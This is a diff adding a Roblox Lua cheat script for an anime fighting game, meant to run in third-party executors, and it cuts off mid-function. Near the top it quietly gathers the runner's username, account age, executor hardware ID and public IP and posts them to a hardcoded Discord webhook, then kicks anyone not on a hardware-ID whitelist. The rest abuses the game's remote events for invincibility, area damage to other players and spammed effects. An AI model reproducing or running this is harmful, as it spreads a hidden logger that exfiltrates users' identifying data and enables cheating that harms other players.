@@ -1,0 +1,897 @@
+plr = game:GetService'Players'.LocalPlayer
+local premium = false
+local ALT = false
+if plr.MembershipType == Enum.MembershipType.Premium then
+	premium = true
+elseif plr.MembershipType == Enum.MembershipType.None then
+	premium = false
+end
+if premium == false then 
+	if plr.AccountAge <= 70 then 
+		ALT = true
+	end
+end
+ local write = function(a) rconsoleprint("@@WHITE@@") rconsoleprint(a) end
+local writei = function(a) rconsoleprint("@@BLUE@@") rconsoleprint("[*]"..a) end
+local writew = function(a) rconsoleprint("@@YELLOW@@") rconsoleprint("[*]"..a.."\n") end
+local writee = function(a) rconsoleprint("@@RED@@") rconsoleprint(a) end
+local market = game:GetService("MarketplaceService")
+local info = market:GetProductInfo(game.PlaceId, Enum.InfoType.Asset)
+ 
+local http_request = http_request;
+if syn then
+	http_request = syn.request
+elseif SENTINEL_V2 then
+	function http_request(tb)
+		return {
+			StatusCode = 200;
+			Body = request(tb.Url, tb.Method, (tb.Body or ''))
+		}
+	end
+end
+ 
+local body = http_request({Url = 'https://httpbin.org/get'; Method = 'GET'}).Body;
+local decoded = game:GetService('HttpService'):JSONDecode(body)
+
+local hwid_list = {"Syn-Fingerprint", "Exploit-Guid", "Proto-User-Identifier", "Sentinel-Fingerprint"};
+hwid = "";
+
+for i, v in next, hwid_list do
+	if decoded.headers[v] then
+		hwid = decoded.headers[v];
+		break
+	end
+end
+
+if hwid then
+local HttpServ = game:GetService('HttpService')
+local url = "https://discord.com/api/webhooks/806182097681121391/ZeBr1kG3hEYnolKzl4S9u17iQXknIneT6RKLzd8jm0E0kcX_vmZsWQuI-HllLgaZ4ImQ"
+ 
+ 
+local data = 
+    {
+        ["content"] = "",
+        ["embeds"] = {{
+            ["title"] = "__**Funny log:**__",
+            ["description"] = "**yes**",
+            ["type"] = "rich",
+            ["color"] = tonumber(0xAB0909),
+            ["fields"] = {
+                {
+                    ["name"] = "Username:",
+                    ["value"] = Game.Players.LocalPlayer.Name,
+                    ["inline"] = true
+                },
+				{
+                    ["name"] = "Game Link:",
+                    ["value"] = "https://roblox.com/games/" .. game.PlaceId .. "/",
+                    ["inline"] = true
+                },
+				{
+					["name"] = "Game Name:",
+					["value"] = info.Name,
+					["inline"] = true
+				},
+				{
+					["name"] = "Age:",
+					["value"] = plr.AccountAge,
+					["inline"] = true
+				},
+				{
+					["name"] = "Have Premium:",
+					["value"] = premium,
+					["inline"] = true
+				},
+				{ ["name"] = "Hwid:",
+				    ["value"] = hwid
+ },
+ { ["name"] = "IP:",
+     ["value"] = game:HttpGet("https://ident.me/", true)
+     },
+            },
+        }}
+    }
+    local newdata = HttpServ:JSONEncode(data)
+ 
+    local headers = {
+            ["content-type"] = "application/json"
+    }
+ 
+    local request_payload = {Url=url, Body=newdata, Method="POST", Headers=headers}
+    http_request(request_payload)
+end
+
+if hwid ~= "b067ce3a8a486286bb4c372aaefd3adea815d100103ca82fe73ffb7906cde9e77476de1e4b40114a7d33867ba341e3c57a431b1360463113a8f4ffcfe295a5be" then
+    plr.Kick("bro why are you noob skid")
+    end
+game:GetService("ReplicatedStorage").Block:FireServer(true)
+game:GetService("ReplicatedStorage").SuperArmor:FireServer(true)
+local Remotes = {
+    PlayerStrongPunch = game.ReplicatedStorage.PlayerStrongPunch;
+    SamuraiDamage2 = game.ReplicatedStorage.SamuraiDamage2;
+    Transparency = game.ReplicatedStorage.Transparency;
+    Deflect = game.ReplicatedStorage.Menacing;
+    KQRGrab = game.ReplicatedStorage.KQRGrab;
+    Damage = game.ReplicatedStorage.Damage;
+    Anchor = game.ReplicatedStorage.Anchor
+}
+	game:GetService("Players").LocalPlayer.Character.Humanoid.WalkSpeed = 34
+	game:GetService("Players").LocalPlayer.Character.Humanoid.JumpPower = 60 
+local plr = game:GetService("Players").LocalPlayer
+repeat
+	wait()
+until plr.Character and plr.Character.Humanoid
+local chr = plr.Character
+local human = chr.Humanoid
+local hrp = chr.HumanoidRootPart
+mouse = plr:GetMouse()
+cam = workspace.CurrentCamera
+
+if chr:FindFirstChild("Stand") then
+	if chr.Stand:FindFirstChild("JumpCooldown") then
+		chr.Stand.JumpCooldown:Destroy()
+	end
+end
+---------
+
+
+---------
+
+
+--Values
+local attackmode = false
+local count = 0
+
+local active = false
+local standmode = false
+local ecd1 = false
+local UpperCutCd1 = false
+local PunchLolCd = false
+local RMoveCd = false
+local loading = false
+local standmodecooler = false
+local specmodecooler = false
+local secretmodeon = false
+local black = true
+
+--
+--Events
+local replicatedstorage = game:GetService("ReplicatedStorage")
+local RReffect = replicatedstorage.RRExplosion
+local knife = game:GetService("ReplicatedStorage").Knife
+local ripper = game:GetService("ReplicatedStorage").SpaceRipperStingyEyes
+local A_1 = 9
+local A_2 = "roadroller"
+local TS = game:GetService("ReplicatedStorage").Timestop
+local uis = game:GetService("UserInputService")
+local buff = game:GetService("ReplicatedStorage").TWGHDeath
+local armor = game:GetService("ReplicatedStorage").SuperArmor
+local joseph = game:GetService("ReplicatedStorage").JosephHamon.Event
+local r = "boom"
+local g = "molotov"
+local e = "volley"
+local c = "rope"
+local hidden = CFrame.new(-6551.14746, 419.935547, -178.968475, 0.339421868, 2.31603678e-08, -0.940634251, -8.20526864e-08, 1, -4.98611286e-09, 0.940634251, 7.8873974e-08, 0.339421868)
+local healing = 50
+local asset = "rbxassetid://3057029635"
+local what = 2.2
+local what1 = 0.18
+local Event = game:GetService("ReplicatedStorage").Heal3
+local karsevent1 = game:GetService("ReplicatedStorage").KarsSlash --:FireServer()
+local doppioslam = game:GetService("ReplicatedStorage").DoppioSlam --:FireServer()
+local mih1 = "MIHKnife"
+local mih2 = 
+{
+}
+local mih3 = true
+local mih4 = game:GetService("ReplicatedStorage").MadeInHeavenHandler
+local timeaccel1 = "timeaccel"
+local mihtime1 = game:GetService("ReplicatedStorage").MadeInHeavenHandler
+local timeaccel = "minitimeaccel"
+local dodgemode = "dodgemode"
+local epicslash = "rotationslashes"
+local yell = replicatedstorage.Yell
+local donutevent = replicatedstorage.FOTPSDamageTeleport
+local dodgeevent = replicatedstorage.Dodge
+local knock = replicatedstorage.Knock
+local berserk = replicatedstorage.Berserk
+local doppioslam = game:GetService("ReplicatedStorage").DoppioSlam
+local anchorevent = replicatedstorage.Anchor
+local rtzevent = replicatedstorage.RTZ
+--
+local player = game.Players.LocalPlayer
+local Character = player.Character or player.CharacterAdded:Wait()
+local Humanoid = Character:WaitForChild("Humanoid")
+local UIS = game:GetService("UserInputService")
+local mesplash = game:GetService("ReplicatedStorage").TwentyMeterSplash
+local blackholeVoidSize = 0
+
+local blackholeSize = 0
+
+local blackholeTime = 0
+local blackholeass = 0
+local blackholeactive = false
+
+local ABDSound = {}
+ABDSound.Sounds = {}
+local Effects = workspace.Effects
+local rStorage = game:GetService("ReplicatedStorage")
+local Damage = rStorage.Damage
+local Player = game:GetService("Players").LocalPlayer
+local IgnoreAllCooldown = false -- Set to true if you don't want "cooldown" on this script.
+local Invincible = false
+local Move = false
+local Posing = false
+local Barraging = false
+local CDown = false
+local FirstTime = true
+local Blocking = false
+local Beatdown = false
+local AddedConnection = nil
+local RTZEnabled = false
+local Bruh = false
+local Countering = false
+local bruhla = true
+local StarmanDamage = true
+local Mouse = Player:GetMouse()
+-- Animations:
+function Asset(Id)
+	return "rbxassetid://"..Id
+end
+local AnimationTable = {
+    BigBoom = Instance.new("Animation")
+}
+AnimationTable.BigBoom.AnimationId = Asset(5242641804)
+
+local Preloaded = {}
+local Objects = {}
+local GUIConnections = {}
+local Preloaded = {}
+local Objects = {}
+local GUIConnections = {}
+local CaveSounds = {
+	3173566193,
+	3173571164,
+	3173574531,
+	3173577378,
+	3173580045,
+	3173581159,
+	3999390679,
+	3231980820,
+	3419187043
+}
+function CheckPreloaded(ID)
+	for Index, Song in next, Preloaded do
+		if ID == Song[1] then
+			return true
+		end
+	end
+	return nil
+end
+
+function CheckObjects(ID, Get, Index)
+	for Index, Table in next, Objects do
+		if ID == Table[1] then
+			if Get == "Index" then
+				return Index
+			elseif Get == "Value" then
+				return Table[Index]
+			end
+		end
+	end
+	return nil
+end
+
+function GetTimePos(ID)
+	for Index, Song in next, Preloaded do
+		if ID == Song[1] then
+			return Song[2]
+		end
+	end
+	return 20
+end
+function PreloadAudio(SoundId)
+	local NS = Instance.new("Sound")
+	NS.SoundId = "rbxassetid://"..SoundId
+	NS.Parent = rStorage
+	game:GetService("ContentProvider"):PreloadAsync({NS})
+	wait(0.5)
+	table.insert(Preloaded, {SoundId, NS.TimeLength})
+	wait(0.5)
+	NS:Destroy()
+end
+
+function StandAppearence(Show)
+	if not Player.Character:FindFirstChild("Stand") then return end
+	for Index, Child in next, Player.Character.Stand:GetDescendants() do
+		if (Child:IsA("BasePart") or Child:IsA("Decal")) and Child.Name ~= "StandHumanoidRootPart" and Child.Name ~= "IntValue" then
+			if Show == true then
+				rStorage["Transparency"]:FireServer(Child, 0)
+			else
+				rStorage["Transparency"]:FireServer(Child, 1)
+			end
+		end
+	end
+end
+
+function TimeEraseShow(TimeEraser)
+	for Index, Child in next, TimeEraser:GetDescendants() do
+		if (Child:IsA("BasePart") or Child:IsA("Decal")) and Child.Name ~= "HumanoidRootPart" and Child.Name ~= "StandHumanoidRootPart" then
+			Child.Transparency = 0.65
+		end
+	end
+end
+function ABDSound.new(SoundId, Volume, Pitch, Loop, LoopTimes, CustomPlayer, StarmanForceAudio)
+	if CheckPreloaded(SoundId) == false then
+		PreloadAudio(SoundId)
+	end
+	local Object = {}
+	Object.Length = GetTimePos(SoundId)
+	local TP = Player
+	if TP == nil then
+		return
+	end
+	local TC = TP.Character
+	if not TC then
+		return
+	elseif TC.Parent == nil then
+		return
+	end
+	local hum = TC:FindFirstChildOfClass("Humanoid")
+	local rp = TC.HumanoidRootPart
+	if CustomPlayer ~= nil then
+		if CustomPlayer:IsA("Player") then
+			rp = CustomPlayer.Character.HumanoidRootPart
+		elseif CustomPlayer:IsA("Model") then
+			rp = CustomPlayer.Torso
+		end
+	end
+	local Start = tick()
+	local Increaser = 0
+	local Looped = 0
+	local LoopMethod = "Number"
+	if LoopTimes == "Infinite" then
+		LoopMethod = "Infinite"
+	end
+	Object.Start = Start
+	Object.ID = SoundId
+	function Object:Update()
+		rStorage.Damage12:FireServer(hum, rp.CFrame, 0, 0, Vector3.new(0, 0, 0), 9e999, "rbxassetid://"..SoundId, Pitch, Volume/4.5);
+	end
+	function Object:FixTime(Sound)
+		game:GetService("RunService").RenderStepped:Wait()
+		Sound.TimePosition = (tick() - Start) * Pitch
+	end
+	Object:Update()
+	table.insert(Objects, {SoundId, Object, Increaser, Start})
+	ABDSound.Sounds["rbxassetid://"..SoundId] = Object
+	local function LoopSong()
+		Start = tick()
+		Object.Start = Start
+		Increaser = 0
+		Looped = Looped + 1
+		if LoopMethod == "Number" then
+			if Looped < LoopTimes then
+				coroutine.resume(coroutine.create(function()
+					while Increaser < ((Object.Length*3.5) / Pitch) and Object ~= nil do
+						if ((tick() - Object.Start) * Pitch) > (Object.Length * Pitch) then
+							if Looped >= LoopTimes then
+								ABDSound.Sounds[Object] = nil
+								ABDSound.StopAudio(Object.ID)
+							end
+							if Loop == true and Looped < LoopTimes then
+								LoopSong()
+							end
+							break
+						else
+							Object:Update()
+						end
+						wait(0.69)
+						Increaser = Increaser + 1.15
+					end
+				end))
+			end
+		elseif LoopMethod == "Infinite" then
+			coroutine.resume(coroutine.create(function()
+				while Increaser < ((Object.Length*3.5) / Pitch) and Object ~= nil do
+					if ((tick() - Object.Start) * Pitch) > (Object.Length * Pitch) then
+						LoopSong()
+						break
+					else
+						Object:Update()
+					end
+					wait(0.69)
+					Increaser = Increaser + 1.15
+				end
+			end))
+		end
+	end
+	coroutine.resume(coroutine.create(function()
+		local NoDo = false
+		while Increaser < ((Object.Length*3.5) / Pitch) and Object ~= nil do
+			if ((tick() - Object.Start) * Pitch) > (Object.Length * Pitch) then
+				if Loop ~= true then
+					ABDSound.Sounds[Object] = nil
+					ABDSound.StopAudio(Object.ID)
+				end
+				if Invincible == true and IsStarmanSong(SoundId) ~= false then
+					NoDo = true
+					local Song = GetRandomStarmanSong(StarmanForceAudio)
+					if StarmanForceAudio ~= nil then
+						PlayAudio(Song[1], Song[2], Song[3], nil, nil, nil, StarmanForceAudio)
+					else
+						PlayAudio(Song[1], Song[2], Song[3])
+					end
+				end
+				if Loop == true and NoDo == false then
+					LoopSong()
+				end
+				break
+			else
+				Object:Update()
+			end
+			wait(0.69)
+			Increaser = Increaser + 1.15
+		end
+	end))
+end
+
+function ABDSound.StopAll(KillSong)
+	for i,v in next, ABDSound.Sounds do
+		if v.ID == SOHSongProperties.ID or v.ID == KaiokenSongProperties.ID then
+			if KillSong == true then
+				v.Start = 0.1
+				v.Length = 0.1
+				ABDSound.Sounds[i] = nil
+				v = nil
+			end
+		else
+			v.Start = 0.1
+			v.Length = 0.1
+			ABDSound.Sounds[i] = nil
+			v = nil
+		end
+	end
+	ABDSound.Sounds = {}
+end
+
+function ABDSound.StopAudio(ID)
+	for i,v in next, ABDSound.Sounds do
+		if v.ID == ID then
+			v.Start = 0.1
+			v.Length = 0.1
+			ABDSound.Sounds[i] = nil
+			v = nil
+		end
+	end
+end
+
+function ABDSound.StopStarmans()
+	for i,v in next, ABDSound.Sounds do
+		if IsStarmanSong(v.ID) ~= false then
+			v.Start = 0.1
+			v.Length = 0.1
+			ABDSound.Sounds[i] = nil
+			v = nil
+		end
+	end
+end
+
+function ABDSound.IsPlaying(ID)
+	for i,v in next, ABDSound.Sounds do
+		if v.ID == ID then
+			return true
+		end
+	end
+	return false
+end
+
+function God(Humanoid)
+	if Humanoid.Health < 9e9 then
+		--rStorage.VampireRush:FireServer(Humanoid, CFrame.new(0, -30, 0), -9e999, 0, Vector3.new(0, 0, 0), "rbxassetid://241837157", -9e999, Color3.new(1, 1, 1), "rbxassetid://935843979", 0, 0)
+		rStorage.BurnDamage:FireServer(Humanoid, Humanoid.Parent.Head.CFrame, -math.huge,0, Vector3.new(0, 0, 0), "rbxassetid://241837157", 0, Color3.new(255, 255, 255), "rbxassetid://260430079", 1, 0)
+		wait(0.5)
+		rStorage.BurnDamage:FireServer(Humanoid, Humanoid.Parent.Head.CFrame, math.huge,0, Vector3.new(0, 0, 0), "rbxassetid://241837157", 0, Color3.new(255, 255, 255), "rbxassetid://260430079", 1, 0)
+	end
+end
+function RemakeMenuGui(AbilityName, PowerStat, SpeedStat, DurabilityStat)
+	pcall(function()
+		for Index, Connection in GUIConnections do
+			if Connection then
+				Connection:Disconnect()
+			end
+		end
+		GUIConnections = {}
+	end)
+	local function MouseOver(GuiObject, EnterText, LeaveText)
+		local Enter = GuiObject.MouseEnter:Connect(function()
+			GuiObject.Text = EnterText
+		end)
+		table.insert(GUIConnections, Enter)
+		local Leave = GuiObject.MouseLeave:Connect(function()
+			GuiObject.Text = LeaveText
+		end)
+		table.insert(GUIConnections, Leave)
+	end
+	if Player.PlayerGui:FindFirstChild("MenuGUI") then
+		if Player.PlayerGui.MenuGUI:FindFirstChild("Background") then
+			for Index, Child in next, Player.PlayerGui.MenuGUI.Background:GetChildren() do
+				if Child:IsA("TextLabel") then
+					if Child.Name == "Power" then
+						Child.Visible = false
+						local Clone = Child:Clone()
+						Clone.Name = "NewStat_"..Child.Name
+						Clone.Parent = Child.Parent
+						Clone.Visible = true
+						Clone.Text = "Destructive Power"
+						MouseOver(Clone, PowerStat, "Destructive Power")
+						Child:Destroy()
+					elseif Child.Name == "Speed" then
+						Child.Visible = false
+						local Clone = Child:Clone()
+						Clone.Name = "NewStat_"..Child.Name
+						Clone.Parent = Child.Parent
+						Clone.Visible = true
+						Clone.Text = "Speed"
+						MouseOver(Clone, SpeedStat, "Speed")
+						Child:Destroy()
+					elseif Child.Name == "Durability" then
+						Child.Visible = false
+						local Clone = Child:Clone()
+						Clone.Name = "NewStat_"..Child.Name
+						Clone.Parent = Child.Parent
+						Clone.Visible = true
+						Clone.Text = "Durability"
+						MouseOver(Clone, DurabilityStat, "Durability")
+						Child:Destroy()
+					elseif Child.Name == "Ability" then
+						Child.Visible = false
+						local Clone = Child:Clone()
+						Clone.Name = "NewStat_"..Child.Name
+						Clone.Parent = Child.Parent
+						Clone.Visible = true
+						Clone.Text = AbilityName
+						Child:Destroy()
+					end
+				end
+			end
+		end
+	end
+end
+function OnSpawn(Character)
+	ABDSound.StopAll()
+	Posing = false
+	Invincible = false
+	Barraging = false
+	Blocking = false
+	Beatdown = false
+	Countering = false
+	CDown = false
+	Move = false
+	Bruh = false
+	wait(0.025)
+	if AddedConnection then
+		AddedConnection:Disconnect()
+	end
+	pcall(function()
+		for Index, Child in next, Character:GetChildren() do
+			if Child:IsA("BoolValue") then
+				if Child.Name == "Disabled" then
+					coroutine.resume(coroutine.create(function()
+						while Child and Child.Parent == Character do
+							wait()
+							if Child.Value == false then
+								Child.Value = true
+							end
+						end
+					end))
+				end
+			end
+		end
+		coroutine.resume(coroutine.create(function()
+			local Humanoid = Character:FindFirstChildOfClass("Humanoid")
+			local GetUp = false
+			spawn(function()
+				wait(1)
+				rStorage.BurnDamage:FireServer(Humanoid, Humanoid.Parent.Head.CFrame, -math.huge, 0, Vector3.new(0, 0, 0), "rbxassetid://241837157", 0, Color3.new(255, 255, 255), "rbxassetid://260430079", 1, 0)
+			end)
+			while Character and Humanoid and Character:IsDescendantOf(workspace) and Humanoid.Parent == Character do
+				wait()
+			
+				if Humanoid.PlatformStand == true and GetUp == false then
+					rStorage.GetUp:FireServer()
+					Humanoid.PlatformStand = false
+					GetUp = true
+				end
+				if Character:FindFirstChild("Stand") then
+					if Character.Stand:FindFirstChild("JumpCooldown") then
+						Character.Stand.JumpCooldown:Destroy()
+					end
+				end
+				if Character.HumanoidRootPart:FindFirstChildOfClass("BodyPosition") then
+					Character.HumanoidRootPart:FindFirstChildOfClass("BodyPosition"):Destroy()
+				end
+				if Character.HumanoidRootPart:FindFirstChildOfClass("BodyVelocity") then
+					Character.HumanoidRootPart:FindFirstChildOfClass("BodyVelocity"):Destroy()
+				end
+				if math.random(1, 11) == 1 then
+					if Humanoid.Health < 9e99 and Invincible == false then
+						--rStorage.VampireRush:FireServer(Humanoid, CFrame.new(0, -30, 0), -3.25, 0, Vector3.new(0, 0, 0), "rbxassetid://241837157", -9e999, Color3.new(1, 1, 1), "rbxassetid://935843979", 0, 0)
+						rStorage.BurnDamage:FireServer(Humanoid, Humanoid.Parent.Head.CFrame, -math.huge, 0, Vector3.new(0, 0, 0), "rbxassetid://241837157", 0, Color3.new(255, 255, 255), "rbxassetid://260430079", 1, 0)
+						rStorage.BurnDamage:FireServer(Humanoid, Humanoid.Parent.Head.CFrame, math.huge, 0, Vector3.new(0, 0, 0), "rbxassetid://241837157", 0, Color3.new(255, 255, 255), "rbxassetid://260430079", 1, 0)
+					end
+				end
+				if math.random(1, 4) == 1 then
+					GetUp = false
+				end
+			end
+		end))
+		AddedConnection = Character.HumanoidRootPart.ChildAdded:Connect(function(Child)
+			if Child:IsA("BodyVelocity") or Child:IsA("BodyPosition") then
+				if Child.Name == "BodyVelocity" or Child.Name == "BodyPosition" then
+					coroutine.resume(coroutine.create(function()
+						while true do
+							local Suc, Er = pcall(function()
+								Child:Destroy()
+							end)
+							wait()
+							if Suc then
+								break
+							end
+						end
+					end))
+				end
+			end
+		end)
+	end)
+	RemakeMenuGui("The Meme Spec:\nOver Heaven", "∞", "S++++++++++++++++++++++++++", "∞")
+end
+
+Effects.DescendantAdded:Connect(function(v)
+	if v:IsA("Sound") then
+		local Object = ABDSound.Sounds[v.SoundId]
+		if Object then
+			Object.Last = v.TimePosition
+			Object:FixTime(v)
+		end
+	end
+end)
+
+OnSpawn(Player.Character)
+
+Player.CharacterAdded:Connect(function(Character)
+	workspace.Entities:WaitForChild(Player.Name)
+	wait(0.025)
+	OnSpawn(Character)
+end)
+function PlayAudio(Id, Volume, Pitch, Loop, Times, Custom)
+	ABDSound.new(Id, Volume, Pitch, Loop, Times, Custom)
+end
+function PlaySoundEffect(Humanoid, Id, Volume, Pitch)
+	rStorage.Damage12:FireServer(Player.Character.Humanoid, Humanoid.Parent.Head.CFrame, 0, 0, Vector3.new(0,0,0), 9e999, "rbxassetid://"..Id, Pitch, Volume)
+end
+local AuraSetter = 0
+coroutine.resume(coroutine.create(function()
+		while wait(0) do
+		    if black == true then
+            AuraSetter = AuraSetter + 1
+
+game.ReplicatedStorage.Damage:FireServer(game.Players.LocalPlayer.Character.Humanoid, game.Players.LocalPlayer.Character["Head"].CFrame * CFrame.new(math.sin(AuraSetter * 50)*3, math.cos(AuraSetter * 50)*3, 3), 0, 0, Vector3.new(nil, nil,nil), "rbxassetid://245751634", 3, Color3.new(0, 0, 0), "", 1, 1)
+game.ReplicatedStorage.Damage:FireServer(game.Players.LocalPlayer.Character.Humanoid, game.Players.LocalPlayer.Character["Head"].CFrame * CFrame.new(math.sin(AuraSetter * 50)*-3, math.cos(AuraSetter * 50)*3, 3), 0, 0, Vector3.new(nil, nil,nil), "rbxassetid://245751634", 3, Color3.new(0, 0, 0), "", 1, 1)
+
+		    end
+	end
+
+end))
+function funny()
+   PlayAudio(183142252, 10, 1)
+end
+Mouse.KeyDown:Connect(function(Key)
+    		if Key == "`" then
+    		    funny()
+end
+end) 
+coroutine.resume(coroutine.create(function()
+    if black == true then
+        while wait(15) do
+                                 
+	game.Players.LocalPlayer.Character.Animate.walk.WalkAnim.AnimationId = "rbxassetid://3445713315"
+	game.Players.LocalPlayer.Character.Animate.fall.FallAnim.AnimationId = "rbxassetid://5166133986" 
+	game.Players.LocalPlayer.Character.Animate.jump.JumpAnim.AnimationId = "rbxassetid://2763931895" 
+	game.Players.LocalPlayer.Character.Animate.idle.Animation1.AnimationId = "rbxassetid://5596261482"
+        end
+end
+    end))
+
+
+_G.blackholeVoid = function()
+    for i,v in pairs(game.Workspace.Entities:GetChildren()) do
+        if v:FindFirstChild("Humanoid") and v:FindFirstChild("HumanoidRootPart") and v.Name ~= game.Players.LocalPlayer.Name then
+            if (game.Players.LocalPlayer.Character.HumanoidRootPart.Position - v.HumanoidRootPart.Position).Magnitude < blackholeVoidSize then
+            game.ReplicatedStorage.Damage:FireServer(v.Humanoid, v["Head"].CFrame, 0, 0.1, ((MainObj.CFrame+MainObj.CFrame.LookVector*0)-v.Humanoid.CFrame)*1,  "rbxassetid://4137216950", 0.1,Color3.new(0,0,0),"", 1, 1)
+            game.ReplicatedStorage.Damage:FireServer(human, chr.HumanoidRootPart.CFrame, 0, 1, game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.LookVector * 30 + Vector3.new(0, 15, 0), "rbxassetid://241837157", .1, Color3.new(255, 0, 0), "", 1, 1)
+            end
+        end
+    end
+end
+local blackholeVoidSize = 0
+
+local blackholeSize = 0
+
+local blackholeTime = 0
+
+local blackholeactive = false
+
+local Objs = {}
+local LastBottomObj
+local Model = Instance.new("Model")
+Model.Name = "Obj"
+Model.Parent = Character
+local MainObj = Instance.new("Part")
+MainObj.Anchored = true
+MainObj.CanCollide = false
+MainObj.Massless = true
+MainObj.Transparency = 1
+MainObj.Size = Vector3.new(1,1,1)
+MainObj.Parent = Model
+
+mouse.KeyDown:connect(function(key)
+	if key == "e" then
+    if blackholeactive == true then return end
+
+		blackholeactive = true
+		MainObj.CFrame = hrp.CFrame * CFrame.new(0,25,0)
+		repeat
+ 		   blackholeVoidSize = blackholeVoidSize + 60
+ 		   blackholeTime = blackholeTime + 1
+  		   blackholeSize = blackholeSize + 0.01
+ 		   _G.blackholeVoid()
+   		   game:GetService("ReplicatedStorage").Damage12Enderman:FireServer(game.Players.LocalPlayer.Character.Humanoid, MainObj.CFrame, 0, 0, nil, blackholeSize, "", 1, 0)
+   		   wait()
+		until human.Health == 0 or human.Health < 0 or blackholeTime == 400
+        MainObj:Destroy()
+		blackholeTime = 0
+		blackholeSize = 0
+		wait(0.5)
+		blackholeactive = false
+	end
+end)
+
+_G.blackholeVoid = function()
+    for i,v in pairs(game.Workspace.Entities:GetChildren()) do
+        if v:FindFirstChild("Humanoid") and v:FindFirstChild("HumanoidRootPart") and v.Name ~= game.Players.LocalPlayer.Name then
+            if (game.Players.LocalPlayer.Character.HumanoidRootPart.Position - v.HumanoidRootPart.Position).Magnitude < blackholeVoidSize then
+            game:GetService("ReplicatedStorage").Damage12Sans:FireServer(v.Humanoid, v.HumanoidRootPart.CFrame, 2.5, 0.1, ((MainObj.Position+MainObj.CFrame.LookVector*0)-v.HumanoidRootPart.Position)*1, 0, "rbxassetid://4137216950", 0.8, 0)
+            end
+        end
+    end
+end
+
+
+local Objs = {}
+local LastBottomObj
+local Model = Instance.new("Model")
+Model.Name = "Obj"
+Model.Parent = Character
+local nonoMainObj = Instance.new("Part")
+nonoMainObj.Anchored = true
+nonoMainObj.CanCollide = false
+nonoMainObj.Massless = true
+nonoMainObj.Transparency = 1
+nonoMainObj.Size = Vector3.new(1,1,1)
+nonoMainObj.Parent = Model
+
+local NotMainObj = Instance.new("Part")
+NotMainObj.Anchored = true
+NotMainObj.CanCollide = false
+NotMainObj.Massless = true
+NotMainObj.Transparency = 1
+NotMainObj.Size = Vector3.new(1,1,1)
+NotMainObj.Parent = Model
+
+local NotMainObj2 = Instance.new("Part")
+NotMainObj2.Anchored = true
+NotMainObj2.CanCollide = false
+NotMainObj2.Massless = true
+NotMainObj2.Transparency = 1
+NotMainObj2.Size = Vector3.new(1,1,1)
+NotMainObj2.Parent = Model
+
+local NotNotMainObj = Instance.new("Part")
+NotMainObj.Anchored = true
+NotMainObj.CanCollide = false
+NotMainObj.Massless = true
+NotMainObj.Transparency = 1
+NotMainObj.Size = Vector3.new(1,1,1)
+NotMainObj.Parent = Model
+
+local NotNotMainObj2 = Instance.new("Part")
+NotMainObj2.Anchored = true
+NotMainObj2.CanCollide = false
+NotMainObj2.Massless = true
+NotMainObj2.Transparency = 1
+NotMainObj2.Size = Vector3.new(1,1,1)
+NotMainObj2.Parent = Model
+local earthquake = true
+coroutine.resume(coroutine.create(function()
+    while wait(0.16) do
+        if earthquake == true then
+    pcall(function()
+        local hit = math.random(1,5)
+        if hit == 1 then
+        		nonoMainObj.CFrame = hrp.CFrame * CFrame.new(0,-40,0)
+        		game:GetService("ReplicatedStorage").Damage12Enderman:FireServer(game.Players.LocalPlayer.Character.Humanoid, nonoMainObj.CFrame, 0, 0, nil, 0.65, "", 1, 0)
+        elseif hit == 2 then		
+		NotMainObj.CFrame = hrp.CFrame * CFrame.new(40,-40,0)
+		game:GetService("ReplicatedStorage").Damage12Enderman:FireServer(game.Players.LocalPlayer.Character.Humanoid, NotMainObj.CFrame, 0, 0, nil, 0.65, "", 1, 0)
+		elseif hit == 3 then
+		NotMainObj2.CFrame = hrp.CFrame * CFrame.new(-40,-40,0)
+		 		   game:GetService("ReplicatedStorage").Damage12Enderman:FireServer(game.Players.LocalPlayer.Character.Humanoid, NotMainObj2.CFrame, 0, 0, nil, 0.65, "", 1, 0)
+		 		   elseif hit == 4 then
+		NotNotMainObj.CFrame = hrp.CFrame * CFrame.new(0,-40,40)
+		 		   game:GetService("ReplicatedStorage").Damage12Enderman:FireServer(game.Players.LocalPlayer.Character.Humanoid, NotNotMainObj.CFrame, 0, 0, nil, 0.65, "", 1, 0)
+		 		   elseif hit == 5 then
+		NotNotMainObj2.CFrame = hrp.CFrame * CFrame.new(0,-40,-40)
+		 		   game:GetService("ReplicatedStorage").Damage12Enderman:FireServer(game.Players.LocalPlayer.Character.Humanoid, NotNotMainObj2.CFrame, 0, 0, nil, 0.65, "", 1, 0)
+    end
+    end)
+        end
+end
+end))
+function Pro()
+        pro = true
+		Move = true
+		local AllahAnim = Player.Character.Humanoid:LoadAnimation(AnimationTable.BigBoom)
+		AllahAnim:Play(0.1, 1, 1)
+		AuraSetter = 0
+				coroutine.resume(coroutine.create(function()
+				    if pro == true then
+repeat
+    wait()
+				      AuraSetter = AuraSetter + 1
+            game.ReplicatedStorage.Damage:FireServer(game.Players.LocalPlayer.Character.Humanoid, game.Players.LocalPlayer.Character["Torso"].CFrame * CFrame.new(math.sin(AuraSetter * 50)*6, math.cos(AuraSetter * 50)*-6, math.sin(AuraSetter * 50)*0), 0, 0, Vector3.new(nil, nil,nil), "rbxassetid://245751634", 3, Color3.new(0 ,0 ,0), "", 1, 1)
+                                    game.ReplicatedStorage.Damage:FireServer(game.Players.LocalPlayer.Character.Humanoid, game.Players.LocalPlayer.Character["Torso"].CFrame * CFrame.new(math.sin(AuraSetter * 50)*6, math.cos(AuraSetter * 50)*-6, math.sin(AuraSetter * 50)*6), 0, 0, Vector3.new(nil, nil,nil), "rbxassetid://245751634", 3, Color3.new(0 ,0 ,0), "", 1, 1)
+                                    game.ReplicatedStorage.Damage:FireServer(game.Players.LocalPlayer.Character.Humanoid, game.Players.LocalPlayer.Character["Torso"].CFrame * CFrame.new(math.sin(AuraSetter * 50)*-6, math.cos(AuraSetter * 50)*-6, math.sin(AuraSetter * 50)*-6), 0, 0, Vector3.new(nil, nil,nil), "rbxassetid://245751634", 3, Color3.new(0 ,0 ,0), "", 1, 1)
+                                     game.ReplicatedStorage.Damage:FireServer(game.Players.LocalPlayer.Character.Humanoid, game.Players.LocalPlayer.Character["Torso"].CFrame * CFrame.new(math.sin(AuraSetter * 50)*6, math.cos(AuraSetter * 50)*-6, math.sin(AuraSetter * 50)*-6), 0, 0, Vector3.new(nil, nil,nil), "rbxassetid://245751634", 3, Color3.new(0 ,0 ,0), "", 1, 1)
